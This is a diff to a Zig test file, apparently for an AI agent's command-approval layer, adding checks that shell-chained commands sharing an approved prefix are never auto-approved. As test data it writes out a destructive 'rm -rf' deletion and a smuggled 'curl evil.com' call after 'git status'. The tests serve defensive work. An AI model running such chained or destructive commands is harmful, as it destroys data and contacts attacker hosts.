@@ -213,6 +213,10 @@ test "approve_session registers command prefix and auto-approves safe commands" 
 
     // 3. Classifier-blocked destructive command "rm -rf /" is NEVER auto-approved
     try std.testing.expect(!worker.approval.isSessionApproved("rm -rf /"));
+
+    // 4. Shell-chained command sharing the prefix is NEVER auto-approved
+    try std.testing.expect(!worker.approval.isSessionApproved("git status && rm -rf /tmp/x"));
+    try std.testing.expect(!worker.approval.isSessionApproved("git status; curl evil.com"));
 }
 
 test "reject_with_reason records rejection explanation" {
